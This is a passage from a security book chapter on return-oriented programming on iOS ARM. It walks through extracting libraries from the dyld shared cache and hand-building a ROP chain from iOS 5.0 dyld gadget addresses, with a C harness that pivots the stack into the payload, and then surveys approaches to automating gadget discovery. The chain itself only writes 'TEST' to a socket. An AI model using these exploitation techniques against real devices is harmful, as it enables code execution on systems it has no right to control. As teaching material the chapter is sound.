Depending on what you have under your control, a different technique has
to be used. But all techniques generally boil down to either shifting the stack
location until it reaches an address under the attacker’s control or moving the
content of a register into the stack pointer.
cc0088..iinndddd 222244 44//1166//22001122 55::4466::3399 PPMM
Chapter 8 n Return-Oriented Programming 225
Manually Constructing a ROP Payload
One of the main obstacles to writing ROP payloads is the amount of time needed
to fi nd just the right instruction sequence to meet your needs. At a very simple
level, because ARM instructions are either two or four bytes aligned, you can
just use a simple disassembler and the grep utility for fi nding them. This can
be enough when it comes to simple payloads, because you generally need only
a handful of instruction sequences. In this section, you explore this process
to get a better feeling of the mental steps that you have to follow to build such
a payload.
On the iPhone, all the system libraries are stored together inside a huge
“cache” called dyld_shared_cache. To start looking for instructions you need
to fi nd a way to extract a library from the shared cache. To do that, you use a
tool called dyld_decache, which you can fi nd at https://github.com/kennytm/
Miscellaneous. Here you see how to export libSystem on Mac OS X with the
decrypted fi le system mounted (relative path):
./dyld_decache -f libSystem
System/Library/Caches/com.apple.dyld/dyld_shared_cache_armv7
The other important parts of the address space where an attacker can fi nd
suitable gadgets are the dynamic linker and the main binary of the application.
The former, called dyld, is located at /usr/lib/dyld. The latter is typically inside
the application bundle.
To write a ROP payload you start by performing a simple operation, such as
writing a word to an already open socket using ROP. The following C code is
what you are trying to emulate using ROP:
char str[] = “TEST”;
write(sock, str, 4);
close(sock);
When you compile this code, you obtain the following ARM assembly code
snippet:
__text:0000307C LDR.W R0, [R7,#0x84+sock] ; int
__text:00003080 LDR.W R1, [R7,#0x84+testString] ;
void *
__text:00003084 LDR.W R2, [R7,#0x84+var_EC] ; size_t
__text:00003088 BLX _write
__text:0000308C STR.W R0, [R7,#0x84+var_F4]
__text:00003090 LDR.W R0, [R7,#0x84+sock] ; int
__text:00003094 BLX _close
As expected, the payload is pretty trivial; the compiler uses the stack to
store the return value of write() and it reads all the necessary parameters
from the stack.
cc0088..iinndddd 222255 44//1166//22001122 55::4466::3399 PPMM
226 Chapter 8 n Return-Oriented Programming
Now that you have a general skeleton of the code, it might be useful to tweak
a few things to make the process of translating from ARM Assembly to ROP as
painless as possible. You assume the sock descriptor is in R6:
MOV R1, $0x54534554
STR R1, [SP, #0]
STR R1, SP
MOV R1, SP
MOV R2, #4
MOV R0, R6
BLX _write
MOV R0, R6
BLX _close
In this payload you made use of the stack as much as possible. In fact, because
with ROP the stack is under an attacker’s control, modeling the shellcode this
way allows you to reduce the number of gadgets to fi nd because you can directly
control the stack content and thus avoid all the store operations on the stack. The
other important difference is that you avoid — as much as possible — changing
the content and layout of the stack by saving references you need, for example
the socket, into unused general-purpose registers.
This example uses dyld, the dynamic linker, from iOS 5.0 to create the ROP
payload. The choice of dyld is important for three reasons:
n It is loaded in the address space of every application.
n It contains a number of library functions.
n Unless the main application binary is randomized (that is, compiled with
MH_PIE fl ags), dyld is not randomized either.
To test the ROP payload, this simple application connects to the remote server
and then stores the payload in a buffer:
int main(int argc, char *argv[])
{
int sock;
struct sockaddr_in echoServAddr;
sock = socket(PF_INET, SOCK_STREAM, 0);
memset(&echoServAddr, 0, sizeof(echoServAddr));
echoServAddr.sin_family = AF_INET;
echoServAddr.sin_addr.s_addr = inet_addr(“192.168.0.3”);
echoServAddr.sin_port = htons(1444);
connect(sock, (struct sockaddr *)&echoServAddr, sizeof(echoServAddr));
DebugBreak();
unsigned int *payload = malloc(300);
int i = 0;
To run the shellcode you use a small assembly snippet that copies the sock vari-
able into the R6 register to comply with the assumption made before. Afterward,
cc0088..iinndddd 222266 44//1166//22001122 55::4466::3399 PPMM
Chapter 8 n Return-Oriented Programming 227
you point the stack pointer to the payload variable that contains your crafted
stack with the ROP gadgets. Finally, to start the execution you pop the program
counter from the newly set stack pointer:
__asm__ __volatile__ (“mov sp, %0\n\t”
“mov r6, %1\n\t”
“pop {pc}”
:
:”m”(payload), “m”(sock)
);
The goal of the fi rst sequence of ROP gadgets is to store R6 into R0. To do this,
the following instructions are executed:
payload[i] = 0x2fe15f81; //2fe15f80 bd96pop {r1, r2, r4, r7, pc
i++;
payload[i] = 0x0; //r1
i++;
payload[i] = 0x2fe05bc9; //r2 2fe05bc9 bdea pop {r1, r3, r5, r6, r7, pc}
i++;
payload[i] = 0x0; //r4
i++;
payload[i] = 0x0; //r7
i++;
payload[i] = 0x2fe0cc91; //pc,
/* 4630 mov r0, r6
4790 blx r2
Blx will jump to 2fe05bc9
*/
Now you want to store R0 into R8 so that when you need to call write() it is
easy to retrieve the sock descriptor:
i++;
payload[i] = 0x0; //r1
i++;
payload[i] = 0x2fe0cc31; //r3
i++;
payload[i] = 0x0; //r5
i++;
payload[i] = 0x0; //r6
i++;
payload[i] = 0x0; //r7
i++;
payload[i] = 0x2fe114e7; //pc
/*
2fe114e6 aa01 add r2, sp, #4
2fe114e8 4798 blx r3
r2 will point to current stack pointer + 4.
cc0088..iinndddd 222277 44//1166//22001122 55::4466::3399 PPMM
228 Chapter 8 n Return-Oriented Programming
blx will jump to 0x2fe0cc31.
2fe0cc30 4680 mov r8, r0
2fe0cc32 4630 mov r0, r6
2fe0cc34 f8d220c0 ldr.w r2, [r2, #192]
2fe0cc38 4790 blx r2
*/
i++;
payload[i + (4 + 192)/4 = 0x2fe05bc9;
/* this is used by the previous gadget to obtain a valid address for r2 to
jump to:
2fe05bc8 bdea pop {r1, r3, r5, r6, r7, pc}
*/
The fi nal step is to set R2 to 4, which is the size of the string you want to write.
Point R1 to the stack location containing the string “TEST” and call write():
i++;
payload[i] = 0x0; //r1
i++;
payload[i] = 0x2fe0b7d5; //r3 bdf0 pop {r4, r5, r6, r7, pc}
i++;
payload[i] = 0x0; //r5
i++;
payload[i] = 0x0; //r6
i++;
payload[i] = 0x2fe00040; //the value pointed by this + 12 is a 4,
the size of the string we want to write
i++;
payload[i] = 0x2fe0f4c5; //pc
/*
2fe0f4c4 a903 add r1, sp, #12
2fe0f4c6 4640 mov r0, r8
2fe0f4c8 68fa ldr r2, [r7, #12]
2fe0f4ca 4798 blx r3
r1 will point to the string, r0 to the sock variable and r2 to 4
*/
i++;
payload[i] = 0x2fe1d730; //r4, address of _write()
i++;
payload[i] = 0x0; //r5
i++;
payload[i] = 0x0; //r6
i++;
payload[i] = 0x54534554; //r7 points to “TEST” but for no good reasons.
Only r1 needs to point here. This is just a side effect.
i++;
payload[i] = 0x2fe076d3; //pc
/*
2fe076d2 47a0 blx r4
cc0088..iinndddd 222288 44//1166//22001122 55::4466::3399 PPMM
Chapter 8 n Return-Oriented Programming 229
2fe076d4 b003 add sp, #12
2fe076d6 bd90 pop {r4, r7, pc}
*/
The procedure for calling close() is pretty much identical, except that only
R0 needs to be set to the sock descriptor (still stored in R8):
payload[i] = 0x0; //unused
i++;
payload[i] = 0x0; //unused
i++;
payload[i] = 0x0; //unused
i++;
payload[i] = 0x0; //r4
i++;
payload[i] = 0x0; //r7
i++;
payload[i] = 0x2fe05bc9; //pc bdea pop {r1, r3, r5, r6, r7, pc}
i++;
payload[i] = 0x0; //r1
i++;
payload[i] = 0x2fe1cf8d; //r3, bdb0 pop {r4, r5, r7, pc}
i++;
payload[i] = 0x0; //r5
i++;
payload[i] = 0x0; //r6
i++;
payload[i] = 0x2fe076d6;
//arbitrary valid address to not crash when r2 is
read from r7 + #12
i++;
payload[i] = 0x2fe0f4c5; //pc
/*
2fe0f4c4 a903 add r1, sp, #12
2fe0f4c6 4640 mov r0, r8
2fe0f4c8 68fa ldr r2, [r7, #12]
2fe0f4ca 4798 blx r3
*/
i++;
payload[i] = 0x2fe1d55c; //r4, address of close()
i++;
payload[i] = 0x0; //r5
i++;
payload[i] = 0x0; //r7
i++;
payload[i] = 0x2fe076d3; //pc
/*
2fe076d2 47a0 blx r4
2fe076d4 b003 add sp, #12
2fe076d6 bd90 pop {r4, r7, pc}
cc0088..iinndddd 222299 44//1166//22001122 55::4466::3399 PPMM
230 Chapter 8 n Return-Oriented Programming
*/
i++;
payload[i] = 0x0; //unused
i++;
payload[i] = 0x0; //unused
i++;
payload[i] = 0x0; //unused
i++;
payload[i] = 0xcccccccc; //end of payload
i++;
payload[i] = 0xcccccccc; //end of payload
i++;
payload[i] = 0xcccccccc; //end of payload pc crashes here
In this example, you may have noticed that even a really simple set of opera-
tions, such as writing to a remote server and closing the connection to it, can
be quite lengthy when ported to ROP. This is especially true when the number
of usable instructions at the attacker’s disposal is limited.
The next section discusses a number of strategies to automate the process of
fi nding and chaining instruction sequences.
Automating ROP Payload Construction
It should be fairly clear by now that the process of fi nding suitable instructions
by hand is cumbersome and could be time-consuming. During the past couple
of years there have been many different proposed approaches to automating
the process.
Kornau showed one of the most complete, albeit resource-intense, methodologies:
http://static.googleusercontent.com/external_content/untrusted_dlcp/
www.zynamics.com/en//downloads/kornau-tim--diplomarbeit--rop.pdf.
The idea behind this approach follows a number of steps. First, because any
assembly instruction set tends to be really rich in terms of instructions, and
each instruction can perform multiple operations at once, it is handy to have a
way to reduce the number of instructions under consideration.
To this end, each binary is fi rst translated into an intermediate language that
has fewer instructions, where each one of these new instructions performs one
and only one operation.
Once a binary is translated into this intermediate language, through some
algorithms that are outside the scope of this chapter, it is possible to have a set
of instructions chained together. Those instruction sequences are commonly
referred to as gadgets. Each gadget has a specifi c use case; for instance, you could
have the gadget move a register into another register or perform a syscall. Of
course, the attacker cannot expect to fi nd exactly what he needs in a binary.
Therefore, a gadget might be carrying other operations besides the ones needed
to achieve a specifi c task. These additional operations are called side effects.
cc0088..iinndddd 223300 44//1166//22001122 55::4466::3399 PPMM
Chapter 8 n Return-Oriented Programming 231
At this stage, the attacker has all the gadgets he could possibly fi nd in a given
binary. This is not enough, though, because another time-consuming phase is
joining together gadgets to create a meaningful payload.
As explained before, each gadget has side effects, and when writing a payload
you have to take these side effects into account. For instance, a gadget that
performs a syscall might also, as a side effect, clobber the contents of a register.
If you needed that register content intact, you would have to fi nd a different
gadget that is semantically equivalent but with different side effects, or take the